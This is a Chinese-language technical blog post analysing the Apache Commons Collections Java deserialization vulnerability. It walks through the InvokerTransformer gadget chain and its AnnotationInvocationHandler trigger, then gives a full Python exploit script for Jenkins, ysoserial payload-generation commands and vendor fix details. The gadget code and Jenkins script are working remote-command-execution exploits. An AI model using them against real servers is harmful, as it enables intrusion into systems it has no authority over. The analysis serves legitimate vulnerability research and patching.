---
layout: post
title: Commons Collections Java反序列化漏洞深入分析
description: ""
tags: [java,unserialize,exploit]
image:
  background: triangular.png
---

*本文中涉及到的相关漏洞为官方已经公开的漏洞并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。*

## 0x01 背景

今年公开的Java相关漏洞中，影响力最大的莫过于这段时间持续火热的Commons Collections反序列化漏洞了。

在2015年11月6日FoxGlove Security安全团队的`@breenmachine` 发布了一篇长博客里，借用Java反序列化和Apache Commons Collections这一基础类库实现远程命令执行的真实案例来到人们的视野，各大Java Web Server纷纷躺枪，这个漏洞横扫WebLogic、WebSphere、JBoss、Jenkins、OpenNMS的最新版。**而在将近10个月前**， Gabriel Lawrence 和Chris Frohoff 就已经在AppSecCali上的一个报告里提到了这个漏洞利用思路。

目前，针对这个“2015年最被低估”的漏洞，各大受影响的Java应用厂商陆续发布了修复后的版本，Apache Commons Collections项目也对存在漏洞的类库进行了一定的安全处理。


## 0x02 从Apache Commons Collections 说起

Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发。

Commons Collections实现了一个TransformedMap类，该类是对Java标准数据结构Map接口的一个扩展。该类可以在一个元素被加入到集合内时，自动对该元素进行特定的修饰变换，具体的变换逻辑由Transformer类定义，Transformer在TransformedMap实例化时作为参数传入。

我们可以通过TransformedMap.decorate()方法，获得一个TransformedMap的实例。

{% highlight java %}
Map tansformedMap = TransformedMap.decorate(map, keyTransformer, valueTransformer);
{% endhighlight %}

当TransformedMap内的key 或者 value发生变化时，就会触发相应的Transformer的transform()方法。另外，还可以使用Transformer数组构造成ChainedTransformer。当触发时，ChainedTransformer可以按顺序调用一系列的变换。而Apache Commons Collections已经内置了一些常用的Transformer，其中InvokerTransformer类就是今天的主角。

它的transform方法如下：

{% highlight java %}
public Object transform(Object input) {
    if (input == null) {
        return null;
    }
    try {
        Class cls = input.getClass();
        Method method = cls.getMethod(iMethodName, iParamTypes);
        return method.invoke(input, iArgs);

    } catch (NoSuchMethodException ex) {
        throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' does not exist");
    } catch (IllegalAccessException ex) {
        throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
    } catch (InvocationTargetException ex) {
        throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' threw an exception", ex);
    }
}
{% endhighlight %}

这个transform(Object input) 中使用Java反射机制调用了input对象的一个方法，而该方法名是实例化InvokerTransformer类时传入的iMethodName成员变量：

{% highlight java %}
public static Transformer getInstance(String methodName) {
    if (methodName == null) {
        throw new IllegalArgumentException("The method to invoke must not be null");
    }
    return new InvokerTransformer(methodName);
}
{% endhighlight %}

也就是说这段反射代码中的调用的方法名和Class对象均可控。于是，我们可以构造一个恶意的Transformer链，借用InvokerTransformer.transform()执行任意命令，测试代码如下：

{% highlight java %}
public class CommonTest {

    public static void main(String[] args) throws Exception {

        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] { String.class,
                        Class[].class }, new Object[] { "getRuntime",
                        new Class[0] }),
                new InvokerTransformer("invoke", new Class[] { Object.class,
                        Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class },
                        new Object[] { "touch /tmp/commontest" }) };

        Transformer transformedChain = new ChainedTransformer(transformers);

        Map normalMap = new HashMap();
        normalMap.put("value", "value");

        Map tansformedMap = TransformedMap.decorate(normalMap, null, transformedChain);

        Map.Entry entry = (Entry) transformedMap.entrySet().iterator().next();
        entry.setValue("test");

    }
}
{% endhighlight %}

以上代码中ConstantTransformer也是Commons Collections内置的一个Transformer，顾名思义可以将待变换的对象，变为一个常量，它的transform()方法代码如下：

{% highlight java %}
public Object transform(Object input) {
    return iConstant;
}
{% endhighlight %}

这样，这段恶意代码本质上就是利用反射调用Runtime() 执行了一段系统命令，作用等同于：

{% highlight java %}
((Runtime) Runtime.class.getMethod("getRuntime",null).invoke(null,null)).exec("touch /tmp/commontest");
{% endhighlight %}

也就是说，一个精心构造的TransformedMap，在其任意键值被修改时，可以触发变换，从而执行任意命令。

那如何进行远程命令执行的利用呢？

## 0x03 使用Java反序列化实现RCE

Java序列化是指把Java对象转换为字节序列的过程；而Java反序列化是指把字节序列恢复为Java对象的过程。很多Java应用会使用序列化的方式传递数据，应用程序接收用户传入的一个字节序列，将其反序列化恢复为Java对象。

这里，如果Java应用没有对传入的序列化数据进行安全性检查，我们可以将恶意的`TransformedMap`序列化后，远程提交给Java应用，如果Java应用可以触发变换，即可成功远程命令执行。那如何让Java应用触发Transformer的变换呢？

在进行反序列化时，我们会调用`ObjectInputStream`类的`readObject()`方法。如果被反序列化的类重写了`readObject()`，那么该类在进行反序列化时，Java会优先调用重写的`readObject()`方法。

结合前述Commons Collections的特性，如果某个可序列化的类重写了`readObject()`方法，并且在`readObject()`中对Map类型的变量进行了键值修改操作，并且这个Map变量是可控的，就可以实现我们的攻击目标了。

于是找到了这个类：`AnnotationInvocationHandler`。该类的代码如下：

{% highlight java %}
class AnnotationInvocationHandler implements InvocationHandler, Serializable {
    private static final long serialVersionUID = 6182022883658399397L;
    private final Class<? extends Annotation> type;
    private final Map<String, Object> memberValues;

AnnotationInvocationHandler(Class<? extends Annotation> type, Map<String, Object> memberValues) {
        Class<?>[] superInterfaces = type.getInterfaces();
        if (!type.isAnnotation() ||
            superInterfaces.length != 1 ||
            superInterfaces[0] != java.lang.annotation.Annotation.class)
            throw new AnnotationFormatError("Attempt to create proxy for a non-annotation type.");
        this.type = type;
        this.memberValues = memberValues;
    }

private void readObject(java.io.ObjectInputStream s)
        throws java.io.IOException, ClassNotFoundException {
        s.defaultReadObject();

        // Check to make sure that types have not evolved incompatibly

        AnnotationType annotationType = null;
        try {
            annotationType = AnnotationType.getInstance(type);
        } catch(IllegalArgumentException e) {
            // Class is no longer an annotation type; time to punch out
            throw new java.io.InvalidObjectException("Non-annotation type in annotation serial stream");
        }

        Map<String, Class<?>> memberTypes = annotationType.memberTypes();

        // If there are annotation members without values, that
        // situation is handled by the invoke method.
        for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {
            String name = memberValue.getKey();
            Class<?> memberType = memberTypes.get(name);
            if (memberType != null) {  // i.e. member still exists
                Object value = memberValue.getValue();
                if (!(memberType.isInstance(value) ||
                      value instanceof ExceptionProxy)) {
                    memberValue.setValue(
                        new AnnotationTypeMismatchExceptionProxy(
                            value.getClass() + "[" + value + "]").setMember(
                                annotationType.members().get(name)));
                }
            }
        }
}
}
{% endhighlight %}
简直完美。它的成员变量memberValue为Map<String, Object> 类型，并且在重写的`readObject()`方法中有`memberValue.setValue()`的操作。

我们可以实例化一个`AnnotationInvocationHandler`类，将其成员变量`memberValues`赋值为精心构造的恶意`TransformedMap`对象。然后将其序列化，提交给未做安全检测的Java应用。Java应用在进行反序列化操作时，则会触发`TransformedMap`的变换函数，执行预设的命令。

## 0x04 Jenkins利用详细分析

想要使用这个漏洞利用Java应用，则需要找一个序列化对象的接收入口，并且这个Java应用使用了Commons Collections库。

从流量上分析，java序列化的数据为以标记（ac ed 00 05）开头，base64编码后的特征为rO0AB。从代码上分析，可以关注`readObject()`方法的使用点。

在<foxglovesecurity.com>发布的文章中，受影响的Java应用程序就已经包括了WebLogic, WebSphere, JBoss, Jenkins, OpenNMS等等。foxglovesec也在GitHub上给出了各受影响应用的Expoit：<https://github.com/foxglovesec>

以Jenkins为例，Jenkins是一个开源的持续集成软件。Jenkins启动后会开放多个端口，除了Web控制台之外还有一个CLI端口。CLI端口为随机的高端口，通过jenkins目录下的`WEB-INF/jenkins-cli.jar`程序可以和CLI端口进行通信。分析通信数据包发现存在base64编码的Java序列化特征值rO0AB。


于是我们可以将数据包中Base64编码的序列化数据 替换为我们构造的恶意数据，发送到Jenkins服务端，实现远程命令执行。

直接使用wireshark抓取这段通信包时，会发现它是经过SSL加密的密文数据。

分析数据包发现，jenkins-cli.jar在与CLI端口通信之前，会先HTTP GET请求一下jenkins的Web控制台，从响应包中解析出CLI的端口，再做后续通信。

如果未解析到`X-Jenkins-CLI2-Port`头，则会解析`X-Jenkins-CLI-Port`头，此时Jenkins-CLI通信协议自动降为Version1，并且无SSL加密。
于是，我们可以通过BurpSuit来篡改通信中的HTTP响应包，删除`X-Jenkins-CLI2-Port`响应头，从而使wireshark可以抓到明文数据包。
设置命令行终端的HTTP代理，一般可以使用环境变量`http_proxy`

{% highlight bash %}
export http_proxy=http://proxyaddress:port
{% endhighlight %}

这里对于Java程序，需要_JAVA_OPTIONS进行设置

{% highlight bash %}
export _JAVA_OPTIONS='-Dhttp.proxyHost=127.0.0.1 -Dhttp.proxyPort=8080'
{% endhighlight %}

再执行jenkins-cli.jar，篡改数据包后，即可使用wireshark抓到明文的Jenkins-CLI通信包。

{% highlight bash %}
java -jar jenkins-cli.jar -s http://x.x.x.x:8888/
{% endhighlight %}

`@breenmachine`给出的完整的利用脚本如下：

{% highlight python %}
#!/usr/bin/python

#usage: ./jenkins.py host port /path/to/payload
import socket
import sys
import requests
import base64

host = sys.argv[1]
port = sys.argv[2]

#Query Jenkins over HTTP to find what port the CLI listener is on
r = requests.get('http://'+host+':'+port)
cli_port = int(r.headers['X-Jenkins-CLI-Port'])

#Open a socket to the CLI port
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_address = (host, cli_port)
print 'connecting to %s port %s' % server_address
sock.connect(server_address)

# Send headers
headers='\x00\x14\x50\x72\x6f\x74\x6f\x63\x6f\x6c\x3a\x43\x4c\x49\x2d\x63\x6f\x6e\x6e\x65\x63\x74'
print 'sending "%s"' % headers
sock.send(headers)

data = sock.recv(1024)
print >>sys.stderr, 'received "%s"' % data

data = sock.recv(1024)
print >>sys.stderr, 'received "%s"' % data

payloadObj = open(sys.argv[3],'rb').read()
payload_b64 = base64.b64encode(payloadObj)
payload='\x3c\x3d\x3d\x3d\x5b\x4a\x45\x4e\x4b\x49\x4e\x53\x20\x52\x45\x4d\x4f\x54\x49\x4e\x47\x20\x43\x41\x50\x41\x43\x49\x54\x59\x5d\x3d\x3d\x3d\x3e'+payload_b64

print 'sending payload...'
'''outf = open('payload.tmp','w')
outf.write(payload)
outf.close()'''
sock.send(payload)
{% endhighlight %}

用法为：

{% highlight bash %}
./jenkins.py host port /path/to/payload
{% endhighlight %}

该利用脚本模拟了与Jenkins-CLI端口通信的过程，其中payload就是精心构造的`AnnotationInvocationHandler`类的序列化字节数据，我们可以使用github上的ysoserial工具进行构造。

{% highlight bash %}
git clone --depth=50 --branch=master https://github.com/frohoff/ysoserial.git frohoff/ysoserial
{% endhighlight %}

进行编译，得到ysoserial-0.0.2-SNAPSHOT-all.jar。
{% highlight bash %}
mvn install -DskipTests=true -Dmaven.javadoc.skip=true -B –V
{% endhighlight %}

生成payload的命令如下：

{% highlight bash %}
java -jar ysoserial-0.0.2-SNAPSHOT-all.jar CommonsCollections1 'touch  /tmp/tmp_test' > tmp_test.ser
{% endhighlight %}

## 0x05 影响与修复

### Apache Commons Collections

Apache Commons Collections在3.2.2版本做了一定的安全处理，对这些不安全的Java类的序列化支持增加了开关，默认为关闭状态。涉及的类包括`CloneTransformer`, `ForClosure`, `InstantiateFactory`, `InstantiateTransformer`, `InvokerTransformer`, `PrototypeCloneFactory`, `PrototypeSerializationFactory`, `WhileClosure`。

如，`InvokerTransformer`类重写了序列化相关方法`writeObject()`和 `readObject()`。

{% highlight java %}
private void writeObject(ObjectOutputStream os) throws IOException {
    FunctorUtils.checkUnsafeSerialization(InvokerTransformer.class);
    os.defaultWriteObject();
}
private void readObject(ObjectInputStream is) throws ClassNotFoundException, IOException {
    FunctorUtils.checkUnsafeSerialization(InvokerTransformer.class);
    is.defaultReadObject();
}
{% endhighlight %}

如果没有开启不安全类的序列化，则会抛出*UnsupportedOperationException*异常：

{% highlight java %}
static void checkUnsafeSerialization(Class clazz) {
    String unsafeSerializableProperty;

    try {
        unsafeSerializableProperty =
            (String) AccessController.doPrivileged(new PrivilegedAction() {
                public Object run() {
                    return System.getProperty(UNSAFE_SERIALIZABLE_PROPERTY);
                }
            });
    } catch (SecurityException ex) {
        unsafeSerializableProperty = null;
    }

    if (!"true".equalsIgnoreCase(unsafeSerializableProperty)) {
        throw new UnsupportedOperationException(
                "Serialization support for " + clazz.getName() + " is disabled for security reasons. " +
                "To enable it set system property '" + UNSAFE_SERIALIZABLE_PROPERTY + "' to 'true', " +
                "but you must ensure that your application does not de-serialize objects from untrusted sources.");
    }
}
{% endhighlight %}

### Jenkins

Jenkins 发布了安全公告，并且在1.638版本中修复了这个漏洞。

### JBoss

RedHat发布JBoss相关产品的[解决方案](https://access.redhat.com/solutions/2045023){:target="_blank"}，受影响的JBoss产品有：

- Red Hat JBoss A-MQ 6.x
- Red Hat JBoss BPM Suite (BPMS) 6.x
- Red Hat JBoss BRMS 6.x
- Red Hat JBoss BRMS 5.x
- Red Hat JBoss Data Grid (JDG) 6.x
- Red Hat JBoss Data Virtualization (JDV) 6.x
- Red Hat JBoss Data Virtualization (JDV) 5.x
- Red Hat JBoss Enterprise Application Platform 6.x
- Red Hat JBoss Enterprise Application Platform 5.x
- Red Hat JBoss Enterprise Application Platform 4.3.x
- Red Hat JBoss Fuse 6.x
- Red Hat JBoss Fuse Service Works (FSW) 6.x
- Red Hat JBoss Operations Network (JBoss ON) 3.x
- Red Hat JBoss Portal 6.x
- Red Hat JBoss SOA Platform (SOA-P) 5.x
- Red Hat JBoss Web Server (JWS) 3.x


### Weblogic

Oracle也发布了[安全告警](http://www.oracle.com/technetwork/topics/security/alert-cve-2015-4852-2763333.html){:target="_blank"},影响版本包括 *Oracle WebLogic Server*

- Version 10.3.6.0
- Version 12.1.2.0
- Version 12.1.3.0
- Version 12.2.1.0

### Websphere

IBM发布了Websphere[安全公告](http://www-01.ibm.com/support/docview.wss?uid=swg21970575){:target="_blank"}，受影响的 WebSphere Application Server 和 IBM WebSphere Application Server Hypervisor Edition 版本有:

- Version 8.5 and 8.5.5 Full Profile and Liberty Profile
- Version 8.0
- Version 7.0

## 0x06 相关CVE

- CVE-2015-7501
- CVE-2015-4852 (Weblogic)
- CVE-2015-7450 (Websphere)

## 0x07 参考资料

foxglovesec blog

foxglovesec exploit

Apache Commons Collections Issue

appseccali-2015-marshalling-pickles

Red Hat JBoss products solution

<br><br>

*Posted on <http://security.tencent.com/blog/msg/97>*
